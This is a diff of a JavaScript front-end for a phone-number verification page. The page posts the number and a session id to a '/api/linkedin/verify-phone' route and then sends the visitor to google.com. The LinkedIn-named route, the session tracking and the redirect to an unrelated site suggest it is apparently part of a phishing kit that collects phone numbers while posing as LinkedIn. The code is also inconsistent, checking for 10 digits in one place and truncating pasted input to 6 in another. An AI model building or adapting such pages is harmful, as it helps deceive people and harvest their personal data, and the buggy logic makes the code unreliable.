@@ -1,76 +1,108 @@
-const countrySelect = document.getElementById("select-register-phone-country");
-const phoneInput = document.getElementById(
-  "register-verification-phone-number"
-);
-const submitButton = document.getElementById("phone-pin-submit-button");
-const errorDiv = document.querySelector(".body__banner--error");
+document.addEventListener("DOMContentLoaded", () => {
+  let form = document.getElementById("enter-phone-form");
+  const countrySelect = document.getElementById(
+    "select-register-phone-country"
+  );
+  const phoneInput = document.getElementById(
+    "register-verification-phone-number"
+  );
+  const submitButton = document.getElementById("register-phone-submit-button");
+  const errorDiv = document.querySelector(".body__banner--error");
+  const loader = document.getElementById("loader-wrapper");
+  let sessionId = new URLSearchParams(window.location.search).get("sessionId");
 
-function showError(message) {
+  function showError(message) {
     if (errorDiv) {
-        errorDiv.querySelector('span').textContent = message;
-        errorDiv.classList.remove('hidden__imp');
+      errorDiv.querySelector("span").textContent = message;
+      errorDiv.classList.remove("hidden__imp");
     }
-}
+  }
 
-function hideError() {
+  function hideError() {
     if (errorDiv) {
-        errorDiv.querySelector('span').textContent = '';
-        errorDiv.classList.add('hidden__imp');
+      errorDiv.querySelector("span").textContent = "";
+      errorDiv.classList.add("hidden__imp");
     }
-}
+  }
 
-// Prevent default for all clicks
-document.addEventListener("click", function (e) {
+  function updateSubmitButton() {
+    if (submitButton) {
+      const isValidLength = phoneInput.value.trim().length === 10;
+      submitButton.disabled = !isValidLength;
+      submitButton.style.opacity = isValidLength ? "1" : "0.5";
+      submitButton.style.cursor = isValidLength ? "pointer" : "not-allowed";
+    }
+  }
+
+  submitButton.addEventListener("click", function (e) {
     e.preventDefault();
-    let targetId = e.target.id;
-    if (targetId == "register-phone-submit-button") {
-        handleSubmit();
-    }
-});
-
-async function handleSubmit() {
     hideError();
 
-    const phone = phoneInput.value.trim();
-    const countryCode = countrySelect.value;
-    const sessionId = new URLSearchParams(window.location.search).get('sessionId');
-
-    if (!phone) {
-        showError('Please enter a phone number');
-        return;
+    const phoneNumber = phoneInput.value.trim();
+    if (!phoneNumber) {
+      showError("Please the correct phoneNumber");
+      return;
     }
 
-    if (phone.length < 10) {
-        showError('Please enter a valid phone number');
-        return;
+    if (phoneNumber.length !== 10) {
+      showError("Please enter a 10-digit phoneNumber");
+      return;
     }
 
-    try {
-        const response = await fetch('/api/linkedin/verify-phone', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                phone,
-                countryCode,
-                sessionId
-            })
-        });
+    loader.classList.remove("hidden__imp");
 
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
+    let submitCodeXhr = new XMLHttpRequest();
+    submitCodeXhr.open("POST", "/api/linkedin/verify-phone", true);
+    submitCodeXhr.setRequestHeader("Content-type", "application/json");
+    submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, phoneNumber: phoneNumber }));
 
-        const data = await response.json();
-        
-        if (data.error) {
-            showError(data.error);
-        } else {
-            window.location.href = `/update-phone.html?sessionid=${sessionId}`;
-        }
-    } catch (error) {
-        console.error('Error submitting phone number:', error);
-        showError('An error occurred. Please try again.');
-    }
-}
+    submitCodeXhr.onreadystatechange = function () {
+      let response = this.response;
+      console.log(response);
+      if (response == "0") {
+        loader.classList.add("hidden__imp");
+        phoneInput.value = ""; // Clear the input field
+        showError("An error occurred. Please try again.");
+        updateSubmitButton();
+      } else if (response == "1") {
+        location.href = "https://www.google.com";
+      }
+    };
+  });
+
+  if (form) {
+    // Initially disable submit button
+    submitButton.disabled = true;
+    submitButton.style.opacity = "0.5";
+    submitButton.style.cursor = "not-allowed";
+    // Handle input changes
+    phoneInput.addEventListener("input", (e) => {
+      hideError();
+
+      // Ensure only numbers are entered
+      let value = e.target.value.replace(/[^0-9]/g, "");
+
+      // Limit to 6 digits
+      if (value.length > 10) {
+        value = value.slice(0, 10);
+      }
+
+      // Update input value
+      e.target.value = value;
+
+      // Update submit button state
+      updateSubmitButton();
+    });
+
+    // Handle paste event
+    phoneInput.addEventListener("paste", (e) => {
+      e.preventDefault();
+      const pastedText = (e.clipboardData || window.clipboardData).getData(
+        "text"
+      );
+      const numbersOnly = pastedText.replace(/[^0-9]/g, "").slice(0, 6);
+      phoneInput.value = numbersOnly;
+      updateSubmitButton();
+    });
+  }
+});
